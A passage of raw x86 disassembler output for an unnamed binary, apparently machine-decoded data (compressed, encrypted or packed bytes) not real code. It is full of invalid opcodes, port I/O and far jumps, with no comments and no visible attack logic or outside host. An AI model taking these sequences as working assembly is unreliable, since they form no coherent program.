  40aff2:	ja     0x40b069
  40aff4:	xchg   ebx,eax
  40aff5:	xchg   esi,eax
  40aff6:	mov    dl,BYTE PTR [ecx]
  40aff8:	xchg   edx,ecx
  40affa:	sbb    bh,al
  40affc:	push   eax
  40affd:	(bad)  
  40affe:	jle    0x40afb1
  40b000:	ja     0x40b014
  40b002:	inc    ecx
  40b003:	stc    
  40b004:	shl    DWORD PTR [esi-0x71],1
  40b007:	in     al,dx
  40b008:	pop    ss
  40b009:	fsubr  QWORD PTR [ebx+0x7f]
  40b00c:	add    al,BYTE PTR [esi-0x64]
  40b00f:	popa   
  40b010:	cs mov cl,0x1
  40b013:	jle    0x40b01d
  40b015:	gs lahf 
  40b017:	push   0x994911ae
  40b01c:	jbe    0x40b063
  40b01e:	cdq    
  40b01f:	mov    ebp,0xf963f80d
  40b024:	push   esp
  40b025:	pop    eax
  40b026:	add    esp,DWORD PTR [ebp-0x876bc5a]
  40b02c:	gs jbe 0x40b0ac
  40b02f:	mov    ?,WORD PTR [esi-0x1fb44354]
  40b035:	(bad)  
  40b036:	sub    al,0x55
  40b038:	sub    bh,BYTE PTR [edi+ebp*8]
  40b03b:	out    dx,eax
  40b03c:	pop    esi
  40b03d:	repnz and eax,0x19315d07
  40b043:	fs in  al,0xbb
  40b046:	popa   
  40b047:	jne    0x40b04e
  40b049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b04a:	sub    BYTE PTR [esi],ah
  40b04c:	mov    ebx,0xbe95df91
  40b051:	xchg   ecx,eax
  40b052:	in     eax,dx
  40b053:	mov    BYTE PTR ds:0xf4b75cca,bh
  40b059:	sub    al,0xcf
  40b05b:	mov    DWORD PTR [edi],esp
  40b05d:	and    eax,0x5578fe9d
  40b062:	arpl   di,bx
  40b064:	mov    edi,0x19064508
  40b069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b06a:	pop    edi
  40b06b:	std    
  40b06c:	and    ah,BYTE PTR [ecx-0x4afb49eb]
  40b072:	pop    ss
  40b073:	sub    al,cl
  40b075:	sub    esp,esi
  40b077:	out    0x66,al
  40b079:	cmp    bl,dl
  40b07b:	outs   dx,BYTE PTR ds:[esi]
  40b07c:	shr    BYTE PTR [edi],cl
  40b07e:	(bad)  
  40b07f:	push   ebp
  40b080:	and    ecx,edi
  40b082:	push   esp
  40b083:	iret   
  40b084:	mov    edi,0x7087b1b7
  40b089:	xchg   ebp,eax
  40b08a:	jbe    0x40b08a
  40b08c:	mov    BYTE PTR [edi+0x57],bh
  40b08f:	cmp    edi,DWORD PTR [eax+0x7fa198ed]
  40b095:	and    DWORD PTR [esi],edi
  40b097:	int    0xc4
  40b099:	jbe    0x40b054
  40b09b:	sub    edi,ecx
  40b09d:	mov    ds:0x18e10b1a,eax
  40b0a2:	outs   dx,DWORD PTR ds:[esi]
  40b0a3:	stos   DWORD PTR es:[edi],eax
  40b0a4:	xor    bh,BYTE PTR [ecx+0x4c2408e8]
  40b0aa:	ins    BYTE PTR es:[edi],dx
  40b0ab:	jb     0x40b0e5
  40b0ad:	out    0xd0,eax
  40b0af:	sbb    BYTE PTR ds:0x52cd3d25,ch
  40b0b5:	pop    edi
  40b0b6:	cmp    eax,DWORD PTR [ecx+0x2d4e9f02]
  40b0bc:	mov    dl,0x2b
  40b0be:	jg     0x40b09b
  40b0c0:	jecxz  0x40b110
  40b0c2:	iret   
  40b0c3:	hlt    
  40b0c4:	in     eax,0x49
  40b0c6:	stos   DWORD PTR es:[edi],eax
  40b0c7:	or     eax,0xfe771175
  40b0cc:	mov    ah,0xa1
  40b0ce:	rcl    DWORD PTR [esi-0x29d78029],0x36
  40b0d5:	xchg   edi,eax
  40b0d6:	fisub  WORD PTR [edx+0x13]
  40b0d9:	xlat   BYTE PTR ds:[ebx]
  40b0da:	and    eax,0xe0899664
  40b0df:	jl     0x40b14d
  40b0e1:	adc    eax,0x840e324a
  40b0e6:	dec    edx
  40b0e7:	enter  0x9eeb,0x96
  40b0eb:	mov    ecx,0xc00defdd
  40b0f0:	jecxz  0x40b0a9
  40b0f2:	(bad)  
  40b0f4:	mov    eax,ds:0x1ae88e75
  40b0f9:	mov    bh,0x1e
  40b0fb:	add    DWORD PTR [ebx-0x3a],ebx
  40b0fe:	xor    ebx,DWORD PTR [ebp-0x47]
  40b101:	adc    eax,0x413aae3c
  40b106:	mov    bh,0xdd
  40b108:	jl     0x40b0a4
  40b10a:	inc    ecx
  40b10b:	int    0xf2
  40b10d:	dec    ebx
  40b10e:	(bad)  
  40b10f:	data16 int3 
  40b111:	pop    ss
  40b112:	cmp    edx,esp
  40b114:	into   
  40b115:	cmp    ch,BYTE PTR [eax-0x71]
  40b118:	dec    ebx
  40b119:	sub    DWORD PTR [eax-0x7b0a6dd3],0xeacde607
  40b123:	push   ebp
  40b124:	rcr    BYTE PTR [ebx-0xbff25ed],1
  40b12a:	inc    edx
  40b12b:	jge    0x40b144
  40b12d:	out    0xa2,eax
  40b12f:	js     0x40b11b
  40b131:	das    
  40b132:	fcmovnbe st,st(3)
  40b134:	out    dx,al
  40b135:	fisub  WORD PTR [ebx+0x72ca659b]
  40b13b:	push   edi
  40b13c:	outs   dx,BYTE PTR ds:[esi]
  40b13d:	mov    dl,0xaa
  40b13f:	(bad)  
  40b140:	popa   
  40b141:	clc    
  40b142:	call   0xdca3:0x40ff6229
  40b149:	out    0x3f,al
  40b14b:	call   FWORD PTR [edx+0x3e]
  40b14e:	mov    bl,0x45
  40b150:	mov    dh,0x11
  40b152:	mov    esi,0x7cb46bed
  40b157:	pusha  
  40b158:	les    esi,FWORD PTR [esi-0x24]
  40b15b:	add    al,0xc6
  40b15d:	outs   dx,BYTE PTR ds:[esi]
  40b15e:	inc    esp
  40b15f:	pop    es
  40b160:	stos   BYTE PTR es:[edi],al
  40b161:	jb     0x40b164
  40b163:	lods   eax,DWORD PTR ds:[esi]
  40b164:	sub    esi,DWORD PTR [eax+0x3b05d5f4]
  40b16a:	ds inc esp
  40b16c:	ins    DWORD PTR es:[edi],dx
  40b16d:	pop    ss
  40b16e:	dec    eax
  40b16f:	fsubr  DWORD PTR [eax]
  40b171:	mov    ebp,0xba3a820e
  40b176:	int3   
  40b177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b178:	mov    dl,0x5d
  40b17a:	retf   0x7aba
  40b17d:	mov    ds:0xc34bef96,eax
  40b182:	inc    ecx
  40b183:	sbb    eax,0x6852261
  40b188:	add    eax,eax
  40b18a:	out    0xe6,al
  40b18c:	or     DWORD PTR [edx+0x23110114],0x580bd1b6
  40b196:	or     eax,0xd46d81ac
  40b19b:	xor    dl,BYTE PTR [eax+0x6a]
  40b19e:	pushf  
  40b19f:	rcr    BYTE PTR [esi-0x48],1
  40b1a2:	clc    
  40b1a3:	inc    ebx
  40b1a4:	data16 jbe 0x40b13f
  40b1a7:	sbb    DWORD PTR [edi],esi
  40b1a9:	dec    ecx
  40b1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ab:	dec    edx
  40b1ac:	push   es
  40b1ad:	inc    edx
  40b1ae:	addr16 sahf 
  40b1b0:	xchg   ebx,eax
  40b1b1:	jnp    0x40b1bd
  40b1b3:	adc    BYTE PTR [ebx-0x33],0xb2
  40b1b7:	in     eax,0xd2
  40b1b9:	push   0x451e226f
  40b1be:	enter  0x4476,0xb0
  40b1c2:	add    al,0xf7
  40b1c4:	lods   al,BYTE PTR ds:[esi]
  40b1c5:	jo     0x40b237
  40b1c7:	fcom   DWORD PTR [ebx+0x1fcca0ba]
  40b1cd:	cmp    al,0xf2
  40b1cf:	add    bh,BYTE PTR [edx]
  40b1d1:	test   ecx,edi
  40b1d3:	in     al,0x72
  40b1d5:	jmp    0x63db1c0c
  40b1da:	or     eax,DWORD PTR [ecx*4-0xb97b520]
  40b1e1:	mov    DWORD PTR [edx],eax
  40b1e3:	js     0x40b239
  40b1e5:	add    al,0xe7
  40b1e7:	cmp    ebx,DWORD PTR [ebx]
  40b1e9:	aam    0x8b
  40b1eb:	push   0xc6c91c56
  40b1f0:	xchg   DWORD PTR [esi-0x38],edx
  40b1f3:	bound  edi,QWORD PTR [edi-0x78]
  40b1f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1f7:	jle    0x40b21c
  40b1f9:	dec    esp
  40b1fa:	dec    ebx
  40b1fb:	jmp    0xfd440e36
  40b200:	and    esi,ebx
  40b202:	and    DWORD PTR [ebp-0x29],0xbb1fbde5
  40b209:	and    edx,ecx
  40b20b:	mov    ebx,?
  40b20d:	(bad)  
  40b20e:	bound  ecx,QWORD PTR [ecx+0x4a78183b]
  40b214:	popf   
  40b215:	push   ebp
  40b216:	adc    eax,0x49a71913
  40b21b:	retf   0xd916
  40b21e:	aas    
  40b21f:	lea    eax,[ebp-0x43]
  40b222:	ror    DWORD PTR [ecx],1
  40b224:	mov    al,ds:0x82db45b0
  40b229:	je     0x40b1b1
  40b22b:	cld    
  40b22c:	pop    ds
  40b22d:	sar    ebp,0xc1
  40b230:	inc    ecx
  40b231:	das    
  40b232:	and    DWORD PTR [esi+0x37],edi
  40b235:	popf   
  40b236:	push   ebx
  40b237:	push   ebx
  40b238:	repz dec edx
  40b23a:	pop    esi
  40b23b:	mov    fs,WORD PTR [edx]
  40b23d:	push   edx
  40b23e:	in     al,dx
  40b23f:	mov    ebx,0x7a1d1c27
  40b244:	retf   
  40b245:	test   al,0x49
  40b247:	mov    edx,0x57f52084
  40b24c:	mov    ebx,0xc31a58da
  40b251:	lods   eax,DWORD PTR ds:[esi]
  40b252:	push   edx
  40b253:	aas    
  40b254:	fldenv [edi]
  40b256:	fbld   TBYTE PTR [edx+0x54]
  40b259:	ins    BYTE PTR es:[edi],dx
  40b25a:	mov    eax,ds:0xa0e625b
  40b25f:	inc    ebp
  40b260:	aas    
  40b261:	add    al,al
  40b263:	repnz sub eax,0x608c9338
  40b269:	dec    esi
  40b26a:	mov    eax,0x8f3c3e67
  40b26f:	dec    ebp
  40b270:	mov    eax,DWORD PTR [edx-0x12281eaf]
  40b276:	mov    ds:0xb7d1624a,al
  40b27b:	(bad)  gs:[edx]
  40b27e:	leave  
  40b27f:	dec    eax
  40b280:	jne    0x40b2b2
  40b282:	jmp    0x40b20c
  40b284:	push   edi
  40b285:	jle    0x40b2ef
  40b287:	shl    DWORD PTR [eax],1
  40b289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b28a:	or     DWORD PTR [edx-0x17d20bdb],edi
  40b290:	sbb    al,0x86
  40b292:	mov    al,ds:0xb9ee68db
  40b297:	push   esp
  40b298:	adc    bl,bh
  40b29a:	stos   DWORD PTR es:[edi],eax
  40b29b:	retf   
  40b29c:	fwait
  40b29d:	retf   
  40b29e:	jo     0x40b2ae
  40b2a0:	shr    BYTE PTR [edi+0x2c],cl
  40b2a3:	xchg   esi,eax
  40b2a4:	or     eax,0xeab94f14
  40b2a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2aa:	adc    DWORD PTR [edi+edi*8-0x729fee58],ebx
  40b2b1:	pop    edx
  40b2b2:	jo     0x40b28e
  40b2b4:	jb     0x40b324
  40b2b6:	or     eax,0xb4ffecac
  40b2bb:	daa    
  40b2bc:	imul   edi,DWORD PTR [ebp-0x6d04513d],0x25
  40b2c3:	jle    0x40b2e0
  40b2c5:	hlt    
  40b2c6:	sbb    esi,ebp
  40b2c8:	mov    ecx,0xc729874c
  40b2cd:	inc    esp
  40b2ce:	cmp    DWORD PTR [ecx],ebp
  40b2d0:	jecxz  0x40b2fb
  40b2d2:	inc    ebx
  40b2d3:	xor    BYTE PTR [eax-0x16],al
  40b2d6:	jmp    0x42e2:0x60627399
  40b2dd:	in     al,dx
  40b2de:	fcom   st(0)
  40b2e0:	inc    edx
  40b2e1:	mov    esi,0x3a068e9a
  40b2e6:	or     edi,DWORD PTR [esi+edx*1]
  40b2e9:	push   edx
  40b2ea:	addr16 pushf 
  40b2ec:	lods   eax,DWORD PTR ds:[esi]
  40b2ed:	dec    ebp
  40b2ee:	imul   eax,DWORD PTR [esi-0x54b7763b],0x27
  40b2f5:	xor    dh,al
  40b2f7:	loope  0x40b2b4
  40b2f9:	jno    0x40b284
  40b2fb:	mov    ebx,0x383b4721
  40b300:	shl    DWORD PTR [ecx-0x80],1
  40b303:	pusha  
  40b304:	mov    eax,ds:0xd6accf46
  40b309:	jp     0xe12f39fb
  40b30f:	mov    al,0xae
  40b311:	cmp    al,0x73
  40b313:	adc    al,0xea
  40b315:	jl     0x40b333
  40b317:	sub    eax,0x8751a272
  40b31c:	out    0x58,eax
  40b31e:	std    
  40b31f:	cmc    
  40b320:	xchg   ebp,eax
  40b321:	mov    WORD PTR [ecx],ss
  40b323:	test   DWORD PTR [ebp+0x27d1c891],ebp
  40b329:	jb     0x40b33b
  40b32b:	inc    sp
  40b32d:	push   ecx
  40b32e:	or     al,0x47
  40b330:	fimul  DWORD PTR [ecx]
  40b332:	pop    ecx
  40b333:	ja     0x40b385
  40b335:	adc    ch,cl
  40b337:	add    al,0x4d
  40b339:	inc    edx
  40b33a:	mov    ecx,0x7f6cfa34
  40b33f:	fsubr  DWORD PTR [edx+0x4b08dc02]
  40b345:	cmp    ecx,DWORD PTR [ecx+0x1c7119c6]
  40b34b:	mov    ds,WORD PTR [ebp-0x557f3e7b]
  40b351:	cmp    DWORD PTR [edx+0x28],edx
  40b354:	and    BYTE PTR [esi],0x5b
  40b357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b358:	lahf   
  40b359:	dec    edi
  40b35a:	sub    al,0xff
  40b35c:	pusha  
  40b35d:	push   esi
  40b35e:	gs pop esp
  40b360:	popa   
  40b361:	fisttp WORD PTR [esi+0x763718d7]
  40b367:	dec    ebx
  40b368:	lods   al,BYTE PTR ds:[esi]
  40b369:	stos   DWORD PTR es:[edi],eax
  40b36a:	xor    eax,0x78a1f081
  40b36f:	loope  0x40b3b6
  40b371:	ret    
  40b372:	dec    esi
  40b373:	pop    esi
  40b374:	xchg   esi,eax
  40b375:	mov    edi,0x1fe8c446
  40b37a:	push   0x63
  40b37c:	mov    edi,0x62b8cb1e
  40b381:	xchg   edx,eax
  40b382:	inc    edi
  40b383:	dec    edi
  40b384:	std    
  40b385:	mov    ds,WORD PTR [ebx+0x4d]
  40b388:	(bad)  
  40b389:	mov    al,0x82
  40b38b:	(bad)  
  40b38c:	aam    0x8c
  40b38e:	lods   eax,DWORD PTR ds:[esi]
  40b38f:	pusha  
  40b390:	mov    ah,0xaa
  40b392:	add    bh,BYTE PTR [eax+0xa]
  40b395:	dec    ecx
  40b396:	jg     0x40b32b
  40b398:	(bad)  
  40b399:	test   al,0xdb
  40b39b:	mov    eax,0x85b163d3
  40b3a0:	cmc    
  40b3a1:	es aaa 
  40b3a3:	jns    0x40b33d
  40b3a5:	fnsave [edx+edi*1]
  40b3a8:	sub    al,0xb2
  40b3aa:	jae    0x40b386
  40b3ac:	dec    BYTE PTR [ebp+0x19]
  40b3af:	mov    ebp,0x107f7d32
  40b3b4:	cmp    eax,0xb84030d0
  40b3b9:	lds    eax,FWORD PTR [esi]
  40b3bb:	aaa    
  40b3bc:	call   0x3b6f:0xd20302ed
  40b3c3:	sbb    dh,BYTE PTR [edi-0x66]
  40b3c6:	fsincos 
  40b3c8:	lds    ebp,FWORD PTR [edi+edi*1]
  40b3cb:	xor    DWORD PTR [eax],ecx
  40b3cd:	nop
  40b3ce:	out    dx,eax
  40b3cf:	repnz aaa 
  40b3d1:	cld    
  40b3d2:	adc    al,0xd
  40b3d4:	rcr    BYTE PTR [edi+0x6],cl
  40b3d7:	mov    edx,0x57b4af9e
  40b3dc:	(bad)
  40b3df:	push   0x14b1715c
  40b3e4:	int    0xa1
  40b3e6:	retf   0xa3f7
  40b3e9:	enter  0xb1a2,0x60
  40b3ed:	call   0xe8a287de
  40b3f2:	sub    bl,BYTE PTR [eax+ebp*4]
  40b3f5:	pushf  
  40b3f6:	inc    ebp
  40b3f7:	lods   al,BYTE PTR ds:[esi]
  40b3f8:	icebp  
  40b3f9:	pop    ebx
  40b3fa:	jmp    0x40b3f2
  40b3fc:	mov    al,ds:0x431c2a42
  40b401:	mov    bl,0x37
  40b403:	sbb    eax,0x7d039ef6
  40b408:	gs push cs
  40b40a:	mov    esp,0x2d9f453d
  40b40f:	jbe    0x40b3ae
  40b411:	sub    BYTE PTR [ebx-0x6e],dh
  40b414:	not    bl
  40b416:	xchg   ecx,edi
  40b418:	adc    ebp,ecx
  40b41a:	mov    eax,0xf1728308
  40b41f:	inc    eax
  40b420:	inc    esp
  40b421:	jne    0x40b431
  40b423:	cmp    eax,DWORD PTR [ebp+0x70]
  40b426:	adc    DWORD PTR [edx+0x55af1ad1],edi
  40b42c:	pop    es
  40b42d:	jecxz  0x40b446
  40b42f:	jg     0x40b3e5
  40b431:	imul   esp,DWORD PTR [esi+0x12751e0b],0xffffff82
  40b438:	adc    dh,dh
  40b43a:	mov    al,ds:0x357e0764
  40b43f:	lea    esi,[eax]
  40b441:	dec    ebp
  40b442:	in     eax,0x6e
  40b444:	inc    esi
  40b445:	or     eax,0xfd5a5c34
  40b44a:	push   ecx
  40b44b:	lahf   
  40b44c:	dec    esp
  40b44d:	adc    edi,DWORD PTR [ecx+0x12]
  40b450:	dec    ecx
  40b451:	jp     0x40b407
  40b453:	into   
  40b454:	aaa    
  40b455:	lock inc esi
  40b457:	and    edi,DWORD PTR [edx+0x7b]
  40b45a:	or     BYTE PTR [ebx+0x66],dl
  40b45d:	clc    
  40b45e:	inc    edi
  40b45f:	xor    dh,BYTE PTR ds:[edx+0x30ed22d8]
  40b466:	cmp    al,0x6a
  40b468:	xor    dh,bl
  40b46a:	lea    edx,[edx-0x312805ec]
  40b470:	add    esp,ebp
  40b472:	adc    esp,esi
  40b474:	mov    ds:0x321f651e,eax
  40b479:	xchg   ebx,eax
  40b47a:	gs xor bl,ch
  40b47d:	add    DWORD PTR [edi+ecx*8],0x60
  40b481:	mov    esp,DWORD PTR [edi+0x2d3a6b2]
  40b487:	inc    esi
  40b488:	aam    0x8
  40b48a:	jmp    0xfd3e:0x8044c70c
  40b491:	pop    ss
  40b492:	sub    eax,0x9d3a9474
  40b497:	ja     0x40b48b
  40b499:	dec    esp
  40b49a:	jge    0x40b49d
  40b49c:	inc    ecx
  40b49d:	xor    ecx,DWORD PTR [ebx]
  40b49f:	dec    edi
  40b4a0:	or     dl,dh
  40b4a2:	retf   0x604
  40b4a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4a6:	cmp    eax,0x726a5eb4
  40b4ab:	psubb  mm4,mm0
  40b4ae:	pop    esp
  40b4af:	sub    BYTE PTR [edi],dh
  40b4b1:	dec    DWORD PTR [edi]
  40b4b3:	or     eax,0xead79d94
  40b4b8:	adc    edx,DWORD PTR [ecx]
  40b4ba:	fs in  al,0x9a
  40b4bd:	cmp    DWORD PTR [ebx+edi*2],0xffffffab
  40b4c1:	xchg   esp,eax
  40b4c2:	arpl   WORD PTR [eax+0x38],dx
  40b4c5:	fisubr WORD PTR [ecx]
  40b4c7:	test   DWORD PTR [ebx-0x4e],esp
  40b4ca:	or     BYTE PTR [ebp-0x3a85f6a0],dl
  40b4d0:	sahf   
  40b4d1:	rol    DWORD PTR [ebp-0x25cf0016],cl
  40b4d7:	in     eax,0xfd
  40b4d9:	jbe    0x40b531
  40b4db:	jbe    0x40b52a
  40b4dd:	push   ecx
  40b4de:	mov    ds:0x1ccbf88e,al
  40b4e3:	mov    ch,0x29
  40b4e5:	or     BYTE PTR [ebx],0x49
  40b4e8:	pop    ecx
  40b4e9:	xor    DWORD PTR [edi],ebp
  40b4eb:	outs   dx,DWORD PTR ds:[esi]
  40b4ec:	ror    BYTE PTR [edx+0x303e5d25],0xba
  40b4f3:	inc    esp
  40b4f4:	sbb    cl,BYTE PTR [eax-0x7b0cffb6]
  40b4fa:	dec    eax
  40b4fb:	mov    bh,0x4a
  40b4fd:	daa    
  40b4fe:	stos   BYTE PTR es:[edi],al
  40b4ff:	pushf  
  40b500:	lds    esp,FWORD PTR [esi+0x7ceaaf60]
  40b506:	lahf   
  40b507:	mov    DWORD PTR [ecx+0x1941ed9e],esp
  40b50d:	push   ds
  40b50e:	loope  0x40b530
  40b510:	das    
  40b511:	out    dx,al
  40b512:	push   0x32
  40b514:	(bad)
  40b518:	retf   
  40b519:	ja     0x40b53b
  40b51b:	adc    BYTE PTR [ebp+0x3c],al
  40b51e:	dec    ebx
  40b51f:	call   0x8df70d4f
  40b524:	das    
  40b525:	cmp    esp,esi
  40b527:	leave  
  40b528:	xor    eax,0xfd393a39
  40b52d:	pop    edx
  40b52e:	sub    DWORD PTR [ebp+0xbcd83b4],ecx
  40b534:	xor    DWORD PTR [esi+0x17],0x1653a2da
  40b53b:	xor    eax,0x384642fd
  40b540:	jl     0x40b4d0
  40b542:	sub    BYTE PTR [eax-0x49d59687],dh
  40b548:	das    
  40b549:	push   esp
  40b54a:	mov    edi,0xfdcb22b2
  40b54f:	mov    dh,BYTE PTR [ebp-0x73]
  40b552:	test   BYTE PTR ds:0xa76b0554,bh
  40b558:	dec    edi
  40b559:	jbe    0x40b563
  40b55b:	pusha  
  40b55c:	iret   
  40b55d:	daa    
  40b55e:	dec    esp
  40b55f:	in     eax,0x93
  40b561:	scas   al,BYTE PTR es:[edi]
  40b562:	pop    ds
  40b563:	fdivr  st,st(1)
  40b565:	sbb    edx,DWORD PTR [esi]
  40b567:	push   ebx
  40b568:	bound  esi,QWORD PTR [ebp-0x65]
  40b56b:	das    
  40b56c:	nop
  40b56d:	mov    gs,WORD PTR [ecx+edi*2+0x18]
  40b571:	mov    eax,ds:0xdd83164e
  40b576:	test   eax,0x71d4d61b
  40b57b:	adc    dl,bl
  40b57d:	mov    cl,BYTE PTR [ebp-0x57]
  40b580:	stos   BYTE PTR es:[edi],al
  40b581:	loopne 0x40b5fe
  40b583:	fidiv  DWORD PTR [eax-0x8]
  40b586:	fnstenv [esi-0x4]
  40b589:	out    dx,eax
  40b58a:	fstp   QWORD PTR [eax+ebp*1]
  40b58d:	xor    ebx,esi
  40b58f:	pop    ss
  40b590:	push   es
  40b591:	xchg   esi,eax
  40b592:	fld    QWORD PTR [ebp-0x23]
  40b595:	fcmovb st,st(5)
  40b597:	mov    ds:0xd6c422bb,al
  40b59c:	dec    esp
  40b59d:	(bad)  
  40b59e:	push   ecx
  40b59f:	(bad)  
  40b5a1:	sub    DWORD PTR [ebx-0x6e],eax
  40b5a4:	xchg   BYTE PTR [eax],bh
  40b5a6:	loopne 0x40b57c
  40b5a8:	scas   al,BYTE PTR es:[edi]
  40b5a9:	pop    ebx
  40b5aa:	fisttp QWORD PTR [ecx+0x77]
  40b5ad:	mov    edi,0xfed34af4
  40b5b2:	ins    DWORD PTR es:[edi],dx
  40b5b3:	xchg   ebx,eax
  40b5b4:	mov    bh,0xc6
  40b5b6:	mov    dl,0xa5
  40b5b8:	add    al,BYTE PTR [ecx+0x1a]
  40b5bb:	cmp    eax,0x2a5dcdda
  40b5c0:	dec    ebp
  40b5c1:	cmp    al,0x5c
  40b5c3:	inc    ecx
  40b5c4:	test   BYTE PTR [edx+0x12],dl
  40b5c7:	ja     0x40b625
  40b5c9:	repz sbb al,dh
  40b5cc:	inc    eax
  40b5cd:	dec    ebp
  40b5ce:	jno    0x40b623
  40b5d0:	shr    DWORD PTR fs:[edi+0x4547804f],1
  40b5d7:	cmp    DWORD PTR [edx+ecx*1],ebp
  40b5da:	rol    bl,1
  40b5dc:	cmp    cl,dh
  40b5de:	enter  0x2a1b,0xa9
  40b5e2:	jae    0x40b622
  40b5e4:	mov    ds:0xff4aeedb,al
  40b5e9:	test   eax,0x7efb579e
  40b5ee:	scas   eax,DWORD PTR es:[edi]
  40b5ef:	in     al,dx
  40b5f0:	sbb    esp,DWORD PTR [ecx+eiz*8-0x4f5e13b4]
  40b5f7:	imul   esi,DWORD PTR [ebp-0xbc01a8f],0xffffff88
  40b5fe:	sbb    dh,dl
  40b600:	xchg   edi,eax
  40b601:	jbe    0x40b63d
  40b603:	imul   ebp,DWORD PTR [eax+0xa],0x4f
  40b607:	adc    eax,0x816ab9b9
  40b60c:	inc    ebx
  40b60d:	call   0x2b41:0xf2a71743
  40b614:	pop    esp
  40b615:	icebp  
  40b616:	jnp    0x40b5b5
  40b618:	mov    eax,ds:0xf3f1ed46
  40b61d:	add    edx,ebx
  40b61f:	icebp  
  40b620:	(bad)  
  40b622:	dec    eax
  40b623:	adc    dh,ch
  40b625:	les    esi,FWORD PTR [edi+0x6b]
  40b628:	pusha  
  40b629:	mov    cl,BYTE PTR [edi+0x3ac81f11]
  40b62f:	iret   
  40b630:	xor    DWORD PTR [ebx-0x59debdf],0xffffff96
  40b637:	lahf   
  40b638:	ja     0x40b616
  40b63a:	push   es
  40b63b:	xchg   edi,eax
  40b63c:	and    BYTE PTR [ebx+eax*4+0x243fca78],0x64
  40b644:	mov    al,0x5d
  40b646:	stos   BYTE PTR es:[edi],al
  40b647:	imul   esp,DWORD PTR [esi],0xffffff8f
  40b64a:	pushf  
  40b64b:	pop    DWORD PTR [ebp+edx*2+0x6b45b828]
  40b652:	mov    WORD PTR [edi],?
  40b654:	xlat   BYTE PTR ds:[ebx]
  40b655:	scas   al,BYTE PTR es:[edi]
  40b656:	in     eax,dx
  40b657:	out    dx,al
  40b658:	jge    0x40b61c
  40b65a:	xor    ecx,DWORD PTR [edx-0x5]
  40b65d:	xchg   BYTE PTR [edi],ah
  40b65f:	lock jmp 0xb1a6:0xe088ea40
  40b667:	adc    BYTE PTR [eax],cl
  40b669:	jp     0x40b690
  40b66b:	or     edx,DWORD PTR [ecx-0x7e362e2b]
  40b671:	gs je  0x40b608
  40b674:	or     bh,BYTE PTR [ebx+0x420e5b6b]
  40b67a:	pop    esi
  40b67b:	stos   DWORD PTR es:[edi],eax
  40b67c:	inc    edx
  40b67d:	pop    ecx
  40b67e:	add    al,0x60
  40b680:	ret    0x9313
  40b683:	sbb    BYTE PTR [edx],dl
  40b685:	pop    ecx
  40b686:	test   ah,dl
  40b688:	test   BYTE PTR [ebp+0x32],al
  40b68b:	test   eax,0xcc57ff69
  40b690:	loopne 0x40b6d6
  40b692:	ret    0x33bf
  40b695:	mov    esi,0xebe3338f
  40b69a:	(bad)  
  40b69b:	cdq    
  40b69c:	lods   al,BYTE PTR ds:[esi]
  40b69d:	jae    0x40b6d7
  40b69f:	out    dx,al
  40b6a0:	test   DWORD PTR [esi],0xd676ae1e
  40b6a6:	lods   eax,DWORD PTR ds:[esi]
  40b6a7:	push   ecx
  40b6a8:	lea    eax,[edi+ebx*1]
  40b6ab:	xor    ebx,DWORD PTR [edx+ecx*8+0x484030d0]
  40b6b2:	cli    
  40b6b3:	mul    DWORD PTR [edx]
  40b6b5:	int3   
  40b6b6:	mov    BYTE PTR [esi],cl
  40b6b8:	cmp    BYTE PTR [ebx],dl
  40b6ba:	and    eax,0x64af3c06
  40b6bf:	xor    DWORD PTR [eax],edi
  40b6c1:	aaa    
  40b6c2:	jno    0x40b70b
  40b6c4:	or     esi,ebx
  40b6c6:	(bad)  
  40b6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6c8:	pop    esp
  40b6c9:	cmp    eax,0x84f25240
  40b6ce:	outs   dx,BYTE PTR ds:[esi]
  40b6cf:	pop    ds
  40b6d0:	out    dx,eax
  40b6d1:	inc    esi
  40b6d2:	ror    BYTE PTR [esi+0x2ff9ebed],1
  40b6d8:	xchg   ebp,eax
  40b6d9:	push   ds
  40b6da:	mov    edx,0x20aa2f46
  40b6df:	cmp    DWORD PTR [edx+eiz*8+0x1c],ebp
  40b6e3:	add    DWORD PTR [ebp+0x2c],esp
  40b6e6:	mov    ch,BYTE PTR [ebx+0x0]
  40b6e9:	pop    edx
  40b6ea:	cld    
  40b6eb:	call   0x4ee0:0x87450af5
  40b6f2:	test   BYTE PTR [edi-0x35612134],ah
  40b6f8:	sar    DWORD PTR [ecx-0x492fb4b],0x94
  40b6ff:	mov    ds:0x3ae895a6,al
  40b704:	retf   
  40b705:	hlt    
  40b706:	loopne 0x40b68c
  40b708:	xor    eax,0xf1a67a79
  40b70d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b70e:	cmp    al,0xf
  40b710:	shl    BYTE PTR [edi],0x4
  40b713:	scas   eax,DWORD PTR es:[edi]
  40b714:	adc    DWORD PTR [eax+edi*1-0x5d338944],ecx
  40b71b:	mov    al,BYTE PTR [ebx]
  40b71d:	lea    edx,[ebx+0x639ac801]
  40b723:	push   ds
  40b724:	sbb    cl,al
  40b726:	jecxz  0x40b78a
  40b728:	das    
  40b729:	cdq    
  40b72a:	mul    BYTE PTR [edi+0xd]
  40b72d:	stos   BYTE PTR es:[edi],al
  40b72e:	(bad)  
  40b72f:	jg     0x40b6b3
  40b731:	dec    esi
  40b732:	out    dx,eax
  40b733:	xchg   DWORD PTR [esi-0x32],edx
  40b736:	or     al,BYTE PTR [ebp-0x353efa4c]
  40b73c:	rol    esi,1
  40b73e:	je     0x40b76e
  40b740:	ficom  WORD PTR [esi-0xdb83b59]
  40b746:	into   
  40b747:	jl     0x40b6cf
  40b749:	and    eax,0x804a7beb
  40b74e:	dec    ebp
  40b74f:	clc    
  40b750:	ins    DWORD PTR es:[edi],dx
  40b751:	adc    ah,BYTE PTR [ebx-0x54acd56c]
  40b757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b758:	pushf  
  40b759:	stc    
  40b75a:	and    esp,DWORD PTR [edi]
  40b75c:	inc    ebx
  40b75d:	mov    al,0x3e
